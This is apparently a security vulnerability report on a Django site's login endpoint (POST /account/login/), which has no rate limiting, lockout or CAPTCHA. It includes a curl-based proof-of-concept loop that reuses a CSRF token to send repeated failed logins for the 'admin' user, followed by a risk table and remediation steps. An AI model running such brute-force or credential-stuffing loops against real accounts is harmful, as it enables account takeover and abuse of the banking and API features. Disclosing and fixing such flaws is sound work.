# Description

Missing restriction of excessive authentication attempts (CWE-307) on `POST /account/login/`. The endpoint enforces no lockout, CAPTCHA, or progressive delay after repeated failures, leaving every account open to brute-force and credential-stuffing — especially serious given the platform exposes a banking section and API keys.

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Send many failed logins for a target user. | Every attempt returns `200`. |
| 2 | Observe no blocking, delay, or CAPTCHA. | Unlimited guessing. |

# PoC

```bash
# First, obtain a CSRF token from the login page
CSRF=$(curl -s -c cookies.txt https://<TARGET>/account/login/ \
  | grep -oP 'csrfmiddlewaretoken" value="\K[^"]+')

for i in $(seq 1 10); do
  curl -s -o /dev/null -w "Attempt $i: HTTP %{http_code}\n" \
    -b cookies.txt -X POST https://<TARGET>/account/login/ \
    -d "csrfmiddlewaretoken=${CSRF}&username=admin&password=wrongpass$i"
done
# Attempt 1: HTTP 200 (no lockout)
# ...
# Attempt 10: HTTP 200 (no lockout)
```

Ten consecutive failures, zero throttling. The CSRF token is required (Django's `CsrfViewMiddleware` is active) but does not expire or rotate on failure, so a single token suffices for an unlimited run.

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | Brute-force/credential-stuffing leads to account compromise. |
| Integrity | Compromised accounts enable banking and API-key abuse. |
| Availability | None directly. |

Overall severity: **Medium** — strong enabler when combined with the username-enumeration oracle and leaked/reused passwords.

# Remediation

1. **Rate-limit** login (e.g. 5 attempts / 15 min per IP and per account).
2. **Progressive lockout / exponential backoff** after consecutive failures.
3. **CAPTCHA** after a small number of failures.

# Author
0xE51EE
